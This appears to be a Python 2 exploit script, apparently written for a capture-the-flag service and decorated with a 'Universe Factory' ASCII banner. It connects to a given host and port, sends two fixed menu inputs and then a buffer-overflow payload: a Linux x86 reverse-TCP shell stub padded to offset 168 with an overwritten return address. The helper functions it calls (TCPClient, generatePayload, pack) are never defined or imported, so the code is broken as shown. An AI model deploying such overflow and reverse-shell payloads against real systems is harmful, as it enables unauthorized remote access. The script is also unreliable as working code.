#!/usr/bin/env python

import os
import sys
import struct
import resource
import time
from socket import *
import telnetlib

offset = 168
def showBanner():
    print "           _       _________          _______  _______  _______  _______  "
    print " |\     /|( (    /|\__   __/|\     /|(  ____ \(  ____ )(  ____ \(  ____ \ "
    print " | )   ( ||  \  ( |   ) (   | )   ( || (    \/| (    )|| (    \/| (    \/ "
    print " | |   | ||   \ | |   | |   | |   | || (__    | (____)|| (_____ | (__     "
    print " | |   | || (\ \) |   | |   ( (   ) )|  __)   |     __)(_____  )|  __)    "
    print " | |   | || | \   |   | |    \ \_/ / | (      | (\ (         ) || (       "
    print " | (___) || )  \  |___) (___  \   /  | (____/\| ) \ \__/\____) || (____/\ "
    print " (_______)|/    )_)\_______/   \_/   (_______/|/   \__/\_______)(_______/ "
    print "  _______  _______  _______ _________ _______  _______           "        
    print " (  ____ \(  ___  )(  ____ \\__   __/(  ___  )(  ____ )|\     /| "
    print " | (    \/| (   ) || (    \/   ) (   | (   ) || (    )|( \   / ) "
    print " | (__    | (___) || |         | |   | |   | || (____)| \ (_) /  "
    print " |  __)   |  ___  || |         | |   | |   | ||     __)  \   /   "
    print " | (      | (   ) || |         | |   | |   | || (\ (      ) (    "
    print " | )      | )   ( || (____/\   | |   | (___) || ) \ \__   | |    "
    print " |/       |/     \|(_______/   )_(   (_______)|/   \__/   \_/    "
    return

def showUsage():
    print "Usage: %s host port" % sys.argv[0]
    return

def exploit(rhost, rport):
    client = TCPClient(rhost, rport)
    client.sendLine("48093572")
    client.sendLine("3")
    buf = generatePayload("linux", "x86", "reverse_tcp", 168) + pack(0x8048563)
    client.send(buf)
    print(buf)
    return
    
if __name__ == "__main__":
    if len(sys.argv) < 3:
        showUsage()
    else:
        exploit(sys.argv[1], int(sys.argv[2]))

